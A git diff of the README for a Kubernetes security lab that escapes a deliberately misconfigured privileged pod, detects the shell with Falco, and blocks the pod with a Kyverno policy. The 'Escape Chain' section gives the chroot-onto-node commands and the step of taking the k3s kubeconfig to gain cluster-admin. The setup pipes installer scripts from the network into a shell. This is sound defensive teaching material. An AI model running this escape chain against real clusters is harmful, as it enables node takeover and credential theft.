@@ -1,51 +1,69 @@
-# Kubernetes Security Lab
+# Kubernetes Attack & Defend — Container Security Lab
 
-A hands-on container-security lab on a single-node k3s cluster.
-Full arc: **land → recon → escape → cluster-admin → detect → prevent.**
-
----
-
-## Architecture
+## Overview
+A hands-on container-security lab built on a single-node k3s cluster running in VMware. The project walks the full security lifecycle on a real cluster: a deliberately misconfigured pod is used to escape its container and pivot to full cluster-admin, the same break-in is then caught in real time with Falco, and finally blocked outright with a Kyverno admission policy. The complete arc is **land → recon → escape → cluster-admin → detect → prevent**, with every phase validated on the live cluster.
 
 ![Kubernetes Security Lab architecture](k8s_security_lab_architecture.png)
 
-```
-ATTACK CHAIN              DETECTION              PREVENTION
-─────────────────         ──────────────         ──────────────────
-kubectl exec (land)   →   Falco (eBPF)       →   Kyverno ClusterPolicy
-ls /host (recon)          syscall probe           block-privileged
-chroot /host (escape)     alert: shell in         block-host-pid
-KUBECONFIG (pivot)        container               block-hostpath
-cluster-admin ✓           Deliverable #2 ✓        pod rejected ✓
-Deliverable #1 ✓
-```
+## Infrastructure
 
----
+| Component       | Detail                                                              |
+|-----------------|--------------------------------------------------------------------|
+| Host OS         | Ubuntu Server 24.04 LTS (VM in VMware, NAT)                         |
+| Cluster         | k3s single-node — `curl -sfL https://get.k3s.io \| sh -`            |
+| Package manager | Helm 3                                                              |
+| Namespace       | `vuln` (the target workload)                                        |
+| Falco           | `falcosecurity/falco` chart · `driver.kind=modern_ebpf` (detection)|
+| Kyverno         | `kyverno/kyverno` chart · admission webhook (prevention)           |
 
-## Environment
+Everything runs on one Ubuntu node. The vulnerable pod is scheduled into the `vuln` namespace; Falco installs cluster-wide and watches the Linux kernel via an eBPF syscall probe, while Kyverno registers as an admission webhook that vets every pod **before** it is allowed to run.
 
-| Component | Detail |
-|-----------|--------|
-| Host OS | Ubuntu Server LTS (VM in VMware) |
-| Cluster | k3s single-node (`curl -sfL https://get.k3s.io \| sh -`) |
-| Package manager | Helm |
-| Namespace | `vuln` |
-| Falco | `falcosecurity/falco` chart · `driver.kind=modern_ebpf` |
-| Kyverno | `kyverno/kyverno` chart |
+## Features
+- Full container-escape chain: privileged pod → node root filesystem → cluster-admin
+- Three stacked misconfigurations demonstrated and explained (`privileged`, `hostPID`, `hostPath:/`)
+- Real-time runtime detection with Falco using a modern eBPF probe
+- Prevention-as-code: a single Kyverno ClusterPolicy that blocks all three misconfigs at admission
+- Best-practice rollout — policy run in **Audit** mode first, reviewed, then flipped to **Enforce**
+- Optional continuous scanning with Trivy Operator (vulnerability + misconfiguration reports)
 
----
+## Tools Used
+- k3s (Kubernetes v1.36)
+- Helm 3
+- Falco (modern eBPF driver)
+- Kyverno
+- kubectl
+- Ubuntu Server 24.04 LTS
+- VMware Workstation
 
-## Prerequisites
+## Security Controls
 
+**Attack — the three misconfigurations that enabled the escape**
+
+| Misconfiguration   | Role in the escape                                         |
+|--------------------|-----------------------------------------------------------|
+| `privileged: true` | Grants the capabilities needed to `chroot` onto the node  |
+| `hostPath: /`      | Mounts the node's entire root filesystem at `/host`       |
+| `hostPID: true`    | Full visibility into the host process tree                |
+
+**Defense — the Kyverno ClusterPolicy that blocks it**
+
+| Rule               | Blocks                                              |
+|--------------------|----------------------------------------------------|
+| `block-privileged` | Any container with `securityContext.privileged`    |
+| `block-host-pid`   | Any pod requesting `hostPID: true`                 |
+| `block-hostpath`   | Any pod mounting a `hostPath` volume               |
+
+## Setup Guide
+
+### Prerequisites
 ```bash
 # k3s
 curl -sfL https://get.k3s.io | sh -
 
-# kubeconfig for non-root
+# kubeconfig for a non-root user
 mkdir -p ~/.kube
 sudo cp /etc/rancher/k3s/k3s.yaml ~/.kube/config
 sudo chown $(id -u):$(id -g) ~/.kube/config
-echo 'export KUBECONFIG=~/.kube/config' >> ~/.bashrc
 export KUBECONFIG=~/.kube/config
 
 # Helm
@@ -55,12 +73,7 @@ curl https://raw.githubusercontent.com/helm/helm/main/scripts/get-helm-3 | bash
 kubectl create namespace vuln
 ```
 
----
-
-## Phase 1–3 — Attack Chain (Deliverable #1)
-
-### Vulnerable pod manifest (`vuln-pod.yaml`)
-
+### 1. The Vulnerable Pod (`vuln-pod.yaml`)
 ```yaml
 apiVersion: v1
 kind: Pod
@@ -85,210 +98,120 @@ spec:
         path: /
         type: Directory
 ```
-
 ```bash
 kubectl apply -f vuln-pod.yaml
 ```
 
-### Escape chain
-
+### 2. The Escape Chain
 ```bash
-# 1. Land
+# 1. Land — shell into the pod
 kubectl exec -it vuln-pod -n vuln -- /bin/bash
 
-# 2. Recon — confirm hostPath mount exposed node root
+# 2. Recon — the node's root filesystem is exposed inside the pod
 ls /host
 
-# 3. Escape — chroot into node root via privileged + mount
+# 3. Escape — chroot onto the node as root
 chroot /host /bin/bash
 
-# 4. Confirm escape
-hostname            # shows node hostname, not container ID
-
-# 5. Pivot to cluster-admin
+# 4. Pivot — steal the cluster kubeconfig, become cluster-admin
 export KUBECONFIG=/etc/rancher/k3s/k3s.yaml
 kubectl get nodes
 kubectl auth can-i '*' '*' --all-namespaces   # → yes
 ```
 
-### Why it worked — 3 stacking misconfigs
-
-| Misconfiguration | Role |
-|------------------|------|
-| `privileged: true` | Grants caps needed to chroot |
-| `hostPath: /` | Exposes node's entire root filesystem at `/host` |
-| `hostPID: true` | Full visibility into host process tree |
-
-> **Gotcha:** `cat /proc/1/cgroup` shows `init.scope` even inside the pod because
-> `hostPID: true` makes PID 1 inside the pod the host's PID 1.
-> Use `cat /proc/self/cgroup` instead — `kubepods` = inside pod, `init.scope` = on host.
-
----
-
-## Phase 4 — Detection with Falco (Deliverable #2)
-
+### 3. Detection with Falco
 ```bash
-# Install
 helm repo add falcosecurity https://falcosecurity.github.io/charts
 helm repo update
 helm install falco falcosecurity/falco \
-  --namespace falco \
-  --create-namespace \
-  --set driver.kind=modern_ebpf \
-  --set tty=true
+  --namespace falco --create-namespace \
+  --set driver.kind=modern_ebpf --set tty=true
 
-# Wait for ready
 kubectl get pods -n falco -w
-
-# Stream alerts
 kubectl logs -n falco -l app.kubernetes.io/name=falco -f
 ```
-
-Re-run the escape chain. Falco fires:
-
+Re-running the escape makes Falco fire in real time:
 ```
-Notice: A shell was spawned in a container with an attached terminal
-  evt_type=execve  user=root
-  c_exepath=/usr/bin/bash  parent=containerd-shim
-  k8s_pod_name=vuln-pod  k8s_ns_name=vuln
-  container_image_repository=docker.io/library/ubuntu
-  container_image_tag=24.04
+Notice A shell was spawned in a container with an attached terminal
+  evt_type=execve user=root c_exepath=/usr/bin/bash parent=containerd-shim
+  k8s_pod_name=vuln-pod k8s_ns_name=vuln
 ```
 
----
-
-## Phase 5 — Prevention with Kyverno (Deliverable #3)
-
-### Install Kyverno
-
+### 4. Prevention with Kyverno (`block-escape.yaml`)
 ```bash
 helm repo add kyverno https://kyverno.github.io/kyverno/
 helm repo update
-helm install kyverno kyverno/kyverno \
-  --namespace kyverno \
-  --create-namespace
-
-kubectl get pods -n kyverno -w
+helm install kyverno kyverno/kyverno --namespace kyverno --create-namespace
 ```
-
-### Policy (`block-escape.yaml`)
-
-Start in **Audit**, review, then flip to **Enforce**.
-
 ```yaml
 apiVersion: kyverno.io/v1
 kind: ClusterPolicy
 metadata:
   name: block-container-escape
 spec:
-  validationFailureAction: Enforce
+  validationFailureAction: Enforce   # start in Audit, then flip to Enforce
   rules:
     - name: block-privileged
-      match:
-        resources:
-          kinds:
-            - Pod
+      match: { resources: { kinds: [Pod] } }
       validate:
         message: "Privileged containers are not allowed."
-        pattern:
-          spec:
-            containers:
-              - =(securityContext):
-                  =(privileged): false
-
+        pattern: { spec: { containers: [ { =(securityContext): { =(privileged): false } } ] } }
     - name: block-host-pid
-      match:
-        resources:
-          kinds:
-            - Pod
+      match: { resources: { kinds: [Pod] } }
       validate:
         message: "hostPID is not allowed."
-        pattern:
-          spec:
-            =(hostPID): false
-
+        pattern: { spec: { =(hostPID): false } }
     - name: block-hostpath
-      match:
-        resources:
-          kinds:
-            - Pod
+      match: { resources: { kinds: [Pod] } }
       validate:
         message: "hostPath volumes are not allowed."
-        pattern:
-          spec:
-            =(volumes):
-              - =(hostPath): null
+        pattern: { spec: { =(volumes): [ { =(hostPath): "null" } ] } }
 ```
-
 ```bash
-# Apply in Audit first
-sed -i 's/Enforce/Audit/' block-escape.yaml
-kubectl apply -f block-escape.yaml
-kubectl get clusterpolicy
-
-# Try the bad pod — allowed but logged
-kubectl apply -f vuln-pod.yaml
-
-# Check audit report
+# Audit first — allowed but logged
+sed -i 's/Enforce/Audit/' block-escape.yaml && kubectl apply -f block-escape.yaml
 kubectl get policyreport -A
-kubectl describe policyreport -A
 
-# Flip to Enforce
-sed -i 's/Audit/Enforce/' block-escape.yaml
-kubectl apply -f block-escape.yaml
-
-# Delete and re-apply — should be REJECTED
+# Flip to Enforce — the bad pod is now rejected at admission
+sed -i 's/Audit/Enforce/' block-escape.yaml && kubectl apply -f block-escape.yaml
 kubectl delete pod vuln-pod -n vuln
-kubectl apply -f vuln-pod.yaml
+kubectl apply -f vuln-pod.yaml   # → BLOCKED
 ```
-
 Expected rejection:
-
 ```
-Error from server: error when creating "vuln-pod.yaml":
-  admission webhook "validate.kyverno.svc-fail" denied the request:
+Error from server: admission webhook "validate.kyverno.svc-fail" denied the request:
   resource Pod/vuln/vuln-pod was blocked due to the following policies
-
   block-container-escape:
-    block-host-pid:    validation error: hostPID is not allowed.
-    block-hostpath:    validation error: hostPath volumes are not allowed.
-    block-privileged:  validation error: Privileged containers are not allowed.
+    block-host-pid:   hostPID is not allowed.
+    block-hostpath:   hostPath volumes are not allowed.
+    block-privileged: Privileged containers are not allowed.
 ```
 
----
+## Screenshots
 
-## Phase 6 (Optional) — Trivy Operator
+### VM Configuration
+![VM Specs](screenshots/1.png)
 
-Continuous vulnerability and misconfiguration scanning across the cluster.
+### k3s Single-Node Cluster Running
+![k3s Node](screenshots/4.png)
 
-```bash
-helm repo add aqua https://aquasecurity.github.io/helm-charts/
-helm repo update
-helm install trivy-operator aqua/trivy-operator \
-  --namespace trivy-system \
-  --create-namespace
+### Vulnerable Pod Manifest — privileged + hostPID + hostPath
+![Vulnerable Pod](screenshots/6.png)
 
-# Check results
-kubectl get vulnerabilityreports -A
-kubectl get configauditreports -A
-```
+### Container Escape — Node Root Filesystem Exposed at /host
+![Node Root Exposed](screenshots/10.png)
 
----
+### Falco Alert — Shell Spawned in Container (detected live)
+![Falco Alert](screenshots/14.png)
 
-## Deliverables Summary
+### Kyverno ClusterPolicy — block-privileged / host-pid / hostpath
+![Kyverno Policy](screenshots/17.png)
 
-| # | Phase | What it proved |
-|---|-------|----------------|
-| 1 | Attack chain | `privileged` + `hostPID` + `hostPath:/` = pod → node root → cluster-admin |
-| 2 | Falco detection | Shell spawn in vuln-pod detected in real time via eBPF syscall tracing |
-| 3 | Kyverno prevention | All 3 misconfigs blocked at admission — pod rejected before it ever runs |
+### Audit-Mode Policy Report — 3 violations flagged
+![Policy Report](screenshots/19.png)
 
----
+### Pod Rejected at Admission — escape blocked
+![Pod Rejected](screenshots/21.png)
 
-## Gotchas
-
-- `/proc/1/cgroup` is unreliable inside a `hostPID:true` pod — use `/proc/self/cgroup`
-- `hostNetwork:true` makes the pod inherit the host hostname — `hostname` alone can't tell inside from outside
-- `lsb_release` may be missing — use `cat /etc/os-release`
-- Backslash line continuations in multi-line `helm install` commands can break on paste — use single-line form
-- YAML typos (`resouces` vs `resources`) cause silent `BadRequest` from Kyverno webhook
+## Author
+Mohamed abdelli
